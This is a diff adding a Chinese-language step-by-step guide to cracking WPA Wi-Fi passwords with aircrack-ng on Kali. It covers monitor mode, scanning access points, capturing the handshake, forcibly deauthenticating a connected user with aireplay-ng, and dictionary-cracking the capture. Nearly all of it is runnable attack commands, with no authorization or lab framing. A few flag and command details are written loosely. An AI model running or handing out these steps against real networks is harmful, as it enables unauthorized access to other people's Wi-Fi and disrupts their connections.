@@ -1,0 +1,41 @@
+一 准备无线网卡：
+1 为什么我们需要一张无线网卡：你的Kali或者Ubuntu主机得现有一张无线网卡，如果你是裸机安装的Kali那么你就可以使用你的计算机自带的无线网卡，但是一般情况下大家都会在虚拟机管理软件（virtualbox或者vmvare）里安装Kali，这样的Kali会以桥接、NAT（或NAT网络）、仅主机（没网）等方式存在，桥接、NAT等都是以有线的方式联网，所以是没有无线网卡的。
+2 拿到USB网卡后：插入USB，然后你需要在virtualbox的Kali的设置的USB设备（选2.0兼容性最好）里添加并启动无线网卡。
+3 iwconfig或者ifconfig查看是否启动成功。
+
+
+
+二 置无线网卡为混杂模式（监听模式）：airmon-ng start wlan0
+注：
+1 一般无线网卡名位wlan0，有线一般是eth0，该命令执行后无线网卡名会可能会由wlan0变为wlan0mon。
+2 在设置混杂之前使用airmon-ng check kill命令检查并杀死可能会干扰监听模式的进程。
+
+
+
+三 通过无线网卡扫描附近AP
+第一种方法：iwlist wlan0mon scan，一般你可以看到AP的MAC地址、广播信道、是否加密、SSID等信息，但是也有可能看到“no results”或者“no supported”等字眼，不要紧，我们使用aircrack扫描。
+第二种方法：airodump-ng wlan0mon。
+
+
+
+四 抓四路握手的包：airodump-ng -w packets.pcap -c 3 --bssid AP'MAC wlan0mon -ignore-negative-one
+-w：保存到哪，和tcpdump的-w一样；
+-c：广播信道号，多个信道是WiFi协议用来做信道复用的，该值通过扫描获取；
+--bssid：AP的MAC地址；
+-ignore-negative-one：这个参数旨在忽略 airodump-ng 工具在某些情况下可能返回的错误值 -1，这可能是由于某些特定的硬件或驱动程序问题导致的。
+
+
+
+五 执行上个命令后，将可以看到已连接WiFi的用户的MAC地址，然后我们重启一个窗口，把它踢下去（当然也可以等其他用户但那样未免不确定性太大了）：aireplay-ng -0 2 -a bssid -c oneonlienusermac wlan0mon
+-0：解除验证，会面跟着的是“要发送的解除验证请求包的数量”；
+-a：AP的MAC地址；
+-c：将被强迫下线的用户的MAC地址
+
+
+
+六 等待用户上线（等待抓包成功）：看到执行抓包的窗口的右上角出现WPA handshake的字样，说明用户上线了，抓包成功。
+注：马上Ctrl+c掉。
+
+
+
+七 开始破解 ：aircrack -w 密码字典 -b bssid packets.pcap
